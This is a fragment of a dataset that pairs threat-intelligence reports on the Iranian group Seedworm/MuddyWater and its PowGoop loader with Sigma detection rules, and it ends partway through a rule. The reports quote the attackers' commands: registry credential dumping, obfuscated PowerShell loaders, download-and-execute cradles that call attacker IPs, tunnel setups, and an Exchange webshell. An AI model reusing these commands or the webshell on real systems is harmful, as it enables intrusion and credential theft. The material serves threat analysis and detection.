    "markdown": "# Seedworm: Iran-Linked Group Continues to Target Organizations in the Middle East\n\n**Group continues to be highly active in 2020, while tentative links to recently discovered PowGoop tool suggest possible retooling.**\n\nPosted: 21 Oct, 2020\n\n---\n\nThe Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East.\n\nMany of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop.\n\nThe recent wave of Seedworm attacks were uncovered by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part of Symantec’s Endpoint Security Complete offering) which linked it to previous Seedworm activity.\n\nAmong the things flagged by Cloud Analytics was a registry key called “SecurityHealthCore\". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor.Mori) was subsequently detected.\n\nAttacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted.\n\nIn one such victim, a sample of Backdoor.Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers.\n\n---\n\n### Table 1. Backdoor.Mori samples used by Seedworm in one organization\n\n| File SHA2                                                        | File path                            | Filename | Parent file SHA2                                                 | Description   |\n| ---------------------------------------------------------------- | ------------------------------------ | -------- | ---------------------------------------------------------------- | ------------- |\n| fd0b8a09f02319f6127f5d17e3070174d6aa0714fcdd3794a0a732f380f13747 | csidl_profile\\public                 | iq1.exe  |                                                                  | Mori backdoor |\n| 59d50a7b0a49642c8a85601e1c97edeba0a711cd1c802710f5d3fdc08b2673dd | csidl_system_drive\\program files\\nfc | fml.dll  | fd0b8a09f02319f6127f5d17e3070174d6aa0714fcdd3794a0a732f380f13747 | Mori backdoor |\n| 4bbcbf1dba0cdd4afa13b62f258aba3aecbcae0f80794b060044a48c499feabc | csidl_common_appdata                 | iq5.exe  |                                                                  | Mori backdoor |\n| 881226d3186f4904e8a7cecae3b5690696a74828035caa0041ea07b57aaa4557 | csidl_system_drive\\program files\\nfc | fml.dll  |                                                                  | Mori backdoor |\n| 70400207a45e77baf25497219c2b9e725246207f10afe67e15b0c274f8895aa9 | csidl_common_appdata                 | Iq3.exe  |                                                                  | Mori backdoor |\n| 8a53d01ca46ec0fab30eb7deab8b083f91a364fcb7f198625e5db2ae43e4cff7 | csidl_system_drive\\program files\\nfc | Fml.dll  |                                                                  | Mori backdoor |\n\n---\n\nDuring this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using open-source tools known as Secure Sockets Funneling (SSF) and Chisel. Seedworm is known to have leveraged Chisel in the past.\n\n### Credential stealing\n\nCredential dumping was done by dumping the contents of the Windows Registry to files in the same directories as Seedworm backdoors. Additionally, Seedworm was also observed using Quarks password dumper (Quarks PwDump) to steal local account password hashes.\n\n- `reg save hklm\\system CSIDL_PROFILE\\public\\system.c`\n- `reg save hklm\\sam CSIDL_PROFILE\\public\\sam.c`\n- `CSIDL_COMMON_APPDATA\\dump.exe --dump-hash-local (sha2: f9c4f95592d0e543bca52f5882eace65fe3bbbb99bcaae6e97000115fb3cb781)`\n\n### Tunneling back to the attackers’ infrastructure\n\nSeedworm was also observed setting up tunnels to its own infrastructure using Secure Sockets Funneling and Chisel. These tools allow the attackers to configure local and remote port forwarding as well as copying files to compromised machines.\n\n---\n\n### Table 2. Hacking tools used by Seedworm in one organization\n\n| File SHA2                                                        | File path                | Filename    | Parent file SHA2                                                 | Description                   |\n| ---------------------------------------------------------------- | ------------------------ | ----------- | ---------------------------------------------------------------- | ----------------------------- |\n| 19ec3f16a42ae58ab6feddc66d7eeecf91d7c61a0ac9cdc231da479088486169 | csidl_common_appdata\\ssf | ssf.exe     | 5c54bd254b752133577df4d8a901cd37562881cab3bd08aee3475355a9740d89 | Secure Sockets Funneling tool |\n| c4599f05a8d44bd315da646064adcf2c90886a705a071f0650ee6d17b739d5c8 | csidl_common_appdata\\ssf | upx-ssf.exe | 5c54bd254b752133577df4d8a901cd37562881cab3bd08aee3475355a9740d89 | Secure Sockets Funneling tool |\n| ad594fa71852bd5652b0c594d5453155d8da8b6f67fcf63b459190d93adf2d88 | csidl_common_appdata     | chisel.exe  |                                                                  | Chisel tool                   |\n\n---\n\n### The PowGoop connection\n\nOn the same machine where Seedworm was active, a tool known as PowGoop was deployed. This same tool was also deployed against several of the organizations attacked by Seedworm in recent months; however, at present Symantec can only establish a medium-confidence link between PowGoop and Seedworm.\n\nPowGoop, which was first publicly reported on in July 2020, is a loader DLL. It likely arrives in a ZIP file named ‘google.zip’ containing the loader itself and legitimate Google binaries used for side-loading it.\n\nIn the same organization as mentioned previously, Symantec observed Seedworm activity which was followed by PowGoop activity just six days later.\n\n---\n\n### Table 3. Mori backdoor and hacking tools used by Seedworm several days before PowGoop was deployed\n\n| Timestamp        | File SHA2                                                        | File path                            | Filename     | Description                   |\n| ---------------- | ---------------------------------------------------------------- | ------------------------------------ | ------------ | ----------------------------- |\n| 30/12/2019 19:00 | fd0b8a09f02319f6127f5d17e3070174d6aa0714fcdd3794a0a732f380f13747 | csidl_profile\\public                 | iq1.exe      | Mori backdoor                 |\n| 20/01/2020 18:23 | 4bbcbf1dba0cdd4afa13b62f258aba3aecbcae0f80794b060044a48c499feabc | csidl_common_appdata                 | iq5.exe      | Mori backdoor                 |\n| 27/05/2020 10:08 | 19ec3f16a42ae58ab6feddc66d7eeecf91d7c61a0ac9cdc231da479088486169 | csidl_common_appdata\\ssf             | ssf.exe      | Secure Sockets Funneling tool |\n| 27/05/2020 10:08 | c4599f05a8d44bd315da646064adcf2c90886a705a071f0650ee6d17b739d5c8 | csidl_common_appdata\\ssf             | upx-ssf.exe  | Secure Sockets Funneling tool |\n| 27/05/2020 10:37 | ad594fa71852bd5652b0c594d5453155d8da8b6f67fcf63b459190d93adf2d88 | csidl_common_appdata                 | chisel.exe   | Chisel tool                   |\n| 10/06/2020 22:55 | 881226d3186f4904e8a7cecae3b5690696a74828035caa0041ea07b57aaa4557 | csidl_system_drive\\program files\\nfc | fml.dll      | Mori backdoor                 |\n| 23/06/2020 18:04 | c4599f05a8d44bd315da646064adcf2c90886a705a071f0650ee6d17b739d5c8 | csidl_common_appdata\\ssf             | upx-ssf.exe  | Secure Sockets Funneling tool |\n| 29/06/2020 14:38 | a224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 | CSIDL_COMMON_APPDATA\\aidabrunhilde   | goopdate.dll | PowGoop                       |\n\n---\n\nIn the majority of recent infections, PowGoop appears to have been deployed via a remote execution tool known as Remadmin. This tool is used to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is used to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe.\n\n- `powershell -exec bypass \"$a=gc C:\\WINDOWS\\TEMP\\ManyaBetta;del C:\\WINDOWS\\TEMP\\ManyaBetta;function Gabrielle($OliviaTomi){$Emlyn = [System.Convert]::FromBase64String($OliviaTomi);return [System.Text.Encoding]::UTF8.GetString($Emlyn);}function Tina($Daisi){$OliviaTomi = [System.Text.Encoding]::UTF8.GetBytes($Daisi);for ($TheresitaNitaChad=0; $TheresitaNitaChad -le $OliviaTomi.count -1; $TheresitaNitaChad++){$OliviaTomi[$TheresitaNitaChad] = $OliviaTomi[$TheresitaNitaChad] - 2;}return [System.Text.Encoding]::UTF8.GetString($OliviaTomi);}function GlyndaMaureen($OliviaTomi){$Rosalinde = Gabrielle $OliviaTomi;$LeonaJolene = Tina $Rosalinde;return $LeonaJolene;};$t =GlyndaMaureen($a);&($ShellId[1] + 'ex') $t;\"`\n\nA feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We have no reason to believe that these are actual people’s names.\n\nOn several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the victim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate ‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file called ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code.\n\n- `powershell -exec bypass \"function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content \" config.txt\";$t =bDd $a;&($ShellId[1] + 'ex') $t;\"`\n\n- `Rundll32.exe CSIDL_COMMON_APPDATA\\andreavania\\goopdate.dll,dllregisterserver`\n\nIn some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’.\n\n- `\"CSIDL_SYSTEM\\wscript.exe\" /e:vbs CSIDL_PROFILE\\[REDACTED]\\documents\\v.txt`\n\nSimilarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools:\n\n- `CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\georgettaemilee\\ssleay32.dll ,DllRegisterServer http://107.173.141.103:443/downloadc.php?key=[REDACTED]`\n- `CSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\samariaantonina\\ssleay32.dll ,DllRegisterServer http://107.173.141.114:443/downloadc.php?key=[REDACTED]`\n\nSimilar download requests were also observed via PowerShell:\n\n- `powershell -exec bypass $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$AaA = \"Do\";$AaB = \" wnloadStr\";$AaC = \"ing\";$s=\"$AaA$AaB$AaC\"('http://23.95.220.166:80/download.php?k=564');$s;`\n- `$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;start-sleep 10;$s=$V.DownloadString('http://104.168.44.16:443/H6qy8yvXhV69mF8CgpmWwKb1oV19xMqaI');iex($s)`\n\nDuring PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity.\n\n- `\"CSIDL_PROFILE\\[REDACTED]\\documents\\ussf.exe\" -c CSIDL_PROFILE\\[REDACTED]\\documents\\config.txt -F 9900 -p [REDACTED] 107.172.97.172`\n- `CSIDL_COMMON_APPDATA\\sharp.cmd client 107.175.0.140:443 R:8888:127.0.0.1:9999`\n- `CSIDL_COMMON_APPDATA\\sharp.cmd server -p [REDACTED] --socks5`\n\n---\n\n### Additional links between Seedworm and PowGoop\n\nIn several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware (Backdoor.Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by DLL side-loading of PowGoop.\n\nAdditionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos, similar to what has been reported on Seedworm‘s Powerstats in the past.\n\n- `powershell -exec bypass $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$aa=$e.DownloadString('https://gist.githubusercontent.com/ffcommax/24587757d3328672954e4155a45ceb02/raw/58954a192b9f10753ad140128b97e54a663ae443/123.txt');iex($aa)`\n\nThese patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To date, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools:\n\n- Use of hard-coded GUID tokens and proxy URLs for command and control (C&C) communications\n- Fetching and executing commands from C&C servers using PowerShell\n- Some low-confidence similarities in code structure and encoding techniques\n\nWhile none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm for any additional evidence.\n\n---\n\n### Thanos ransomware link\n\nPowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of ransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer.\n\nOur peers at Palo Alto Networks reported that PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos. This lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection.\n\nSymantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the simultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used exclusively to deliver Thanos.\n\nSymantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia, and Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education.\n\n---\n\n### Vigilance required\n\nSeedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across the Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s part. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough investigation.\n\n---\n\n### Protection\n\nThe following protections are in place to protect customers against Seedworm attacks:\n\n**File-based protection**\n\n- Backdoor.Mori\n- Backdoor.Powemuddy\n- Downloader.Covic\n\n**Network-based protection**\n\n- System Infected: Trojan.Backdoor Activity 243\n\n---\n\n### Indicators of Compromise\n\n| IOC type     | IOC                                                              | Description                               |\n| ------------ | ---------------------------------------------------------------- | ----------------------------------------- |\n| file_sha2    | 200e2448b5ea343f8224f1b3945842bc33cedd9a543930d9b0f038508f00fc82 | PowGoop/Covic                             |\n| file_sha2    | dbcaf92cef112cc438014df4d70acc4e05d68fcbd1d3d9a946130babe7fb94fd | PowGoop/Covic                             |\n| file_sha2    | 3621bb900674cd249f3c93a442d06af0a390bf773c26fc0506b568fd9e395d9f | PowGoop/Covic                             |\n| file_sha2    | 1827f822af72998e2c2e17c1fbc1e97892419ccad0ffe803e38a6f9b3e62ef1a | PowGoop/Covic                             |\n| file_sha2    | be202975c100caf7d85ad7e98e38279280e7c63482dd421bbce1495755c75622 | PowGoop/Covic                             |\n| file_sha2    | 9f4c3cdb011798335258549f5e660dbf65a0f44ed991f12d1fd16c075879c942 | PowGoop/Covic                             |\n| file_sha2    | a224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 | PowGoop/Covic                             |\n| file_sha2    | 85859c909b1da57733dbf8be36a0aad73b97113914e34f32c478ce75e5511c8d | google.zip                                |\n| file_sha2    | 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71 | Remadmin                                  |\n| file_sha2    | c4599f05a8d44bd315da646064adcf2c90886a705a071f0650ee6d17b739d5c8 | Secure Sockets Funneling tool             |\n| file_sha2    | 7200e2d151aa73a89311f5dd1b6f41b0aac653b377ee9106a7883ba9120d6985 | Secure Sockets Funneling tool             |\n| file_sha2    | 59d50a7b0a49642c8a85601e1c97edeba0a711cd1c802710f5d3fdc08b2673dd | Mori backdoor                             |\n| file_sha2    | 4bbcbf1dba0cdd4afa13b62f258aba3aecbcae0f80794b060044a48c499feabc | Mori backdoor                             |\n| file_sha2    | 881226d3186f4904e8a7cecae3b5690696a74828035caa0041ea07b57aaa4557 | Mori backdoor                             |\n| file_sha2    | fd0b8a09f02319f6127f5d17e3070174d6aa0714fcdd3794a0a732f380f13747 | Mori backdoor                             |\n| file_sha2    | 70400207a45e77baf25497219c2b9e725246207f10afe67e15b0c274f8895aa9 | Mori backdoor                             |\n| file_sha2    | 8a53d01ca46ec0fab30eb7deab8b083f91a364fcb7f198625e5db2ae43e4cff7 | Mori backdoor                             |\n| file_sha2    | d3bbb2fee563108345db9d8b6feb72352ea7534798f72757a7e114bf94f2ac78 | google.zip                                |\n| file_sha2    | 9f2b765ba1361b77307f79d91472e99e142c716e22c410fe528771c233e08822 | Mimikatz                                  |\n| file_sha2    | 950469b0acef00d8074eb1642d153675f07a13ab8eb4acada30c06df0c3261d2 | Mimikatz                                  |\n| file_sha2    | ad594fa71852bd5652b0c594d5453155d8da8b6f67fcf63b459190d93adf2d88 | Chisel                                    |\n| command_line | goopdate.dll, dllregisterserver                                  | PowGoop/ Covic                            |\n| remote_ip    | 104.168.14.116                                                   | PowGoop/Covic                             |\n| remote_ip    | 185.141.27.156                                                   | PowGoop/Covic                             |\n| remote_ip    | 107.175.0.140                                                    | IP used with Chisel tool                  |\n| remote_ip    | 107.173.181.139                                                  | IP used with Chisel tool                  |\n| remote_ip    | 185.183.96.11                                                    | PowGoop/Covic                             |\n| remote_ip    | 107.172.97.172                                                   | IP used with Secure Socket Funneling tool |\n| remote_ip    | 192.210.214.83                                                   | PowGoop/Covic                             |\n| remote_ip    | 107.173.141.103                                                  | PowGoop/Covic                             |\n| remote_ip    | 107.173.141.114                                                  | PowGoop/Covic                             |",
    "sigma_rule": {
      "title": "HackTool - Quarks PwDump Execution",
      "id": "0685b176-c816-4837-8e7b-1216f346636b",
      "status": "test",
      "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
      "references": [
        "https://github.com/quarkslab/quarkspwdump",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\QuarksPwDump.exe"
        },
        "selection_cli": {
          "CommandLine": [
            " -dhl",
            " --dump-hash-local",
            " -dhdc",
            " --dump-hash-domain-cached",
            " --dump-bitlocker",
            " -dhd ",
            " --dump-hash-domain ",
            "--ntds-file"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_quarks_pwdump.yml",
    "id": "223"
  },
  {
    "url": "https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/",
    "markdown": "",
    "sigma_rule": {
      "title": "HackTool - SecurityXploded Execution",
      "id": "7679d464-4f74-45e2-9e01-ac66c5eb041a",
      "status": "stable",
      "description": "Detects the execution of SecurityXploded Tools",
      "references": [
        "https://securityxploded.com/",
        "https://web.archive.org/web/20200601000524/https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2018-12-19",
      "modified": "2023-02-04",
      "tags": [
        "attack.credential-access",
        "attack.t1555"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Company": "SecurityXploded"
          },
          {
            "Image|endswith": "PasswordDump.exe"
          },
          {
            "OriginalFileName|endswith": "PasswordDump.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_secutyxploded.yml",
    "id": "226"
  },
  {
    "url": "https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/",
    "markdown": "# Wading Through Muddy Waters | Recent Activity of an Iranian State-Sponsored Threat Actor\n\n**Date:** January 12, 2022\n**Category:** Advanced Persistent Threat\n\n## Overview\n\nMuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available. As of January 12th, 2022, U.S. CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS). While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.\n\nAs in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.\n\nU.S. Cyber Command pointed to multiple malware sets used by MuddyWater. Among those, PowGoop correlates with activities we’ve triaged in recent incidents. We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.\n\n## Analysis of New PowGoop Variants\n\nPowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking (T1574.001). The name derives from the usage `GoogleUpdate.exe` to load a malicious modified version of `goopdate.dll`, which is used to load a malicious PowerShell script from an external file. Other variants were described by ClearSkySec and Symantec.\n\nWe identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures. The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs. Aside from `GoogleUpdate.exe`, three additional benign pieces of software are abused in order to sideload malicious DLLs: `Git.exe`, `FileSyncConfig.exe`, and `Inno_Updater.exe`.\n\nEach contains a modified DLL and a renamed authentic DLL. The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers. The list of hijacked DLLs is presented below:\n\n| **Software Name**  | **Hijacked DLL** | **Renamed DLL**  |\n| ------------------ | ---------------- | ---------------- |\n| GoogleUpdate.exe   | goopdate.dll     | goopdate86.dll   |\n| inno_updater.exe   | vcruntime140.dll | vcruntime141.dll |\n| FileSyncConfig.exe | vcruntime140.dll | vcruntime141.dll |\n| git.exe            | libpcre2-8-0.dll | libpcre2-8-1.dll |\n\nUnlike previous versions, the hijacked DLLs attempt to reflectively load two additional files, one named `Core.dat`, which is a shellcode called from the export `DllReg` and the other named `Dore.dat`, which is a PE file with a `MZRE` header, allowing it to execute as a shellcode as well, similarly to the publicly reported techniques, called from the export `DllRege`.\n\nBoth `Dore.dat` and `Core.dat` search for a file named `config.txt` and run it using PowerShell in a fashion similar to older versions (T1059.001). The overlap in functionality between the two components is not clear; however, it is evident that `Core.dat` represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.\n\n```image\nAlt: Execution flow of new PowGoop variants\nDescription: The image illustrates the execution flow of new variants of the PowGoop malware. It features a central hexagon labeled 'Hijacked Software' with a skull icon, indicating malicious activity. Arrows point to a 'Renamed DLL' which is then linked to a 'Malicious DLL'. From the 'Malicious DLL', two branches lead to 'Core.dat' (labeled as Shellcode running in PowerShell) and 'Dore.dat' (indicated as a Modified PE). Additionally, there is a connection to 'config.txt', showing a structured flow of how the malware operates and its components.\nTranscription: |\n  Hijacked Software\n     │\n     ├── LOAD → Malicious DLL\n     │        ├── EXPORT → Renamed DLL\n     │        ├── REFLECTIVE LOAD → Core.dat (Shellcode)\n     │        │                                ├── RUN POWERSHELL → config.txt\n     │        ├── REFLECTIVE LOAD → Dore.dat (Modified PE)\n     │\n  SentinelLABS\n```\n\n## MuddyWater Tunneling Activity\n\nThe operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts (T1572). The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities. Among the tunneling tools MuddyWater attackers were observed using are Chisel, SSF, and Ligolo.\n\nThis is an example of a command executed by the attackers on some of the victims:\n\n```\nSharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999\n```\n\nThe “`r`” flag used in the client execution implies the server is running in “reverse” mode. Setting the `--reverse` flag, according to Chisel documentation, “allows clients to specify reverse port forwarding remotes in addition to normal remotes”.\n\nBy setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5. This actually creates a tunnel within a tunnel.\n\n```image\nAlt: Summary of MuddyWater tunneling using Chisel\nDescription: The image is a diagram illustrating the tunneling process used by the MuddyWater threat actor. It shows the setup involving an operator using a SOCKSS client to connect to a Chisel reverse server hosted on a VPS. The diagram details the flow of data between the operator and the victim machine, highlighting the use of various ports (8888, 8080, and 9999) for communication. The components are labeled with their respective roles, such as the 'Chisel Reverse Client' and 'Chisel SOCKSS Server', visually representing how the tunneling architecture allows for reverse port forwarding.\nTranscription: |\n                                                                                     Victim Machine\n  +----------------+          +-------------------------+          +-------------------+       +------------------+\n  |   Operator     |  8888    |          VPS            |  8080    |      Chisel       | 9999  |      Chisel      | TARGET\n  | SOCKSS Client  | <----->  |  Chisel Reverse Server  | <----->  |      Reverse      | ----> |      SOCKSS      | ---->\n  |     8888       |          |          8080           |          |      Client       |       |      Server      |\n  +----------------+          +-------------------------+          +-------------------+       +------------------+\n```\n\n## Exchange Exploitation\n\nWhen tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations. The attackers attempt to exploit Exchange servers using two different tools:\n\n- A publicly available script for exploiting CVE-2020-0688 (T1190)\n- Ruler – an open source Exchange exploitation framework\n\n### CVE-2020-0688 Exploitation\n\nThe MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East. The exploit enables remote code execution for an authenticated user. The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.\n\nThe attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path `/ecp/HybridLogout.aspx`. The webshell awaits the parameter `cmd` and runs the commands in it utilizing XSL Script Processing (T1220).\n\n```image\nAlt: A snippet of the webshell MuddyWater attempted to upload to Exchange servers\nDescription: The image displays a snippet of code written in a scripting language, which is likely intended for web shell execution. The code includes a function for handling HTTP context requests in a web application, using the `ActiveXObject` to execute a command on the server. It captures the output of the command and writes it back to the HTTP response. This code snippet is associated with the exploitation of CVE-2020-0688 and illustrates the technical details of how the MuddyWater threat group attempted to utilize the vulnerability.\nTranscription: |\n  <![CDATA[\n  function xml() {\n      var c=System.Web.HttpContext.Current;\n      var Request=c.Request;\n      var Response=c.Response;\n      var command = Request.Item['cmd'];\n      var r = new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c \"+command);\n      var OutStream = r.StdOut;\n      var Str = \"\";\n      while (!OutStream.atEndOfStream) {\n          Str = Str + OutStream.readAll();\n      }\n      Response.Write(\"<pre>\"+Str+\"</pre>\");\n  }]>\n```\n\nThis activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.\n\n```image\nAlt: A snippet of CVE-2020-0688 exploitation script\nDescription: The image displays a snippet of code related to a webshell that was uploaded as part of an exploit attempt. The code includes a print statement indicating successful webshell upload to the specified path, as well as a continuous loop that takes user input for a command (`cmd`). It constructs a request using the `CraftREQ` function and retrieves output from the response, employing regex to extract specific data from the response text. The overall context relates to the exploitation of CVE-2020-0688.\nTranscription: |\n  print(\"\\n[+] Webshell uploaded and working at: [/ecp/HybridLogout.aspx]\")\n  \n  while True:\n      cmd = input(\"cmd> \")\n      resp, _ = CraftREQ(\n          rce_output + \"?cmd=\" + cmd, cookies=new_cookie, method=\"GET\", proxy=proxy\n      )\n      print(str(re.findall(r\">([^<]*)<\", str(resp.text))[0]))\n```\n\n### Ruler Exploitation\n\nAmong other activities performed by the threat actors was attempted Ruler exploitation. The instance identified targeted a telecommunication company in the Middle East. The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler (T1137.003).\n\nUsage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.\n\n## Summary\n\nAnalysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques. While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection. This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.\n\nLike many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups. Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.\n\n## Indicators of Compromise\n\n**PowGoop variants (MD5, SHA1, SHA256)**\n\n- **Goopdate.dll**\n  - A5981C4FA0A3D232CE7F7CE1225D9C7E\n  - 8FED2FF6B739C13BADB14C1A884D738C80CB6F34\n  - AA48F06EA8BFEBDC0CACE9EA5A2F9CE00C094CE10DF52462C4B9E87FEFE70F94\n- **Libpcre2-8-0.dll**\n  - F8E7FF6895A18CC3D05D024AC7D8BE3E\n  - 97248B6E445D38D48334A30A916E7D9DDA33A9B2\n  - F1178846036F903C28B4AB752AFE1B38B531196677400C2250AC23377CF44EC3\n- **Vcruntime140.dll**\n  - CEC48BCDEDEBC962CE45B63E201C0624\n  - 81F46998C92427032378E5DEAD48BDFC9128B225\n  - DD7EE54B12A55BCC67DA4CEAED6E636B7BD30D4DB6F6C594E9510E1E605ADE92\n- **Core.dat**\n  - A65696D6B65F7159C9FFCD4119F60195\n  - 570F7272412FF8257ED6868D90727A459E3B179E\n  - B5B1E26312E0574464DDEF92C51D5F597E07DBA90617C0528EC9F494AF7E8504\n- **Dore.dat**\n  - 6C084C8F5A61C6BEC5EB5573A2D51FFB\n  - 61608ED1DE56D0E4FE6AF07ECBA0BD0A69D825B8\n  - 7E7545D14DF7B618B3B1BC24321780C164A0A14D3600DBAC0F91AFBCE1A2F9F4\n\n## MITRE ATT&CK\n\n- T1190 – Exploit Public-Facing Application\n- T1572 – Protocol Tunneling\n- T1574.001 – Hijack Execution Flow: DLL Search Order Hijacking\n- T1059.001 – Command and Scripting Interpreter: PowerShell\n- T1505.003 – Server Software Component: Web Shell\n- T1220 – XSL Script Processing",
    "sigma_rule": {
      "title": "HackTool - SharpChisel Execution",
      "id": "cf93e05e-d798-4d9e-b522-b0248dc61eaf",
      "related": [
        {
          "id": "8b0e12da-d3c3-49db-bb4f-256703f380e5",
          "type": "similar"
        }
      ],
      "status": "test",
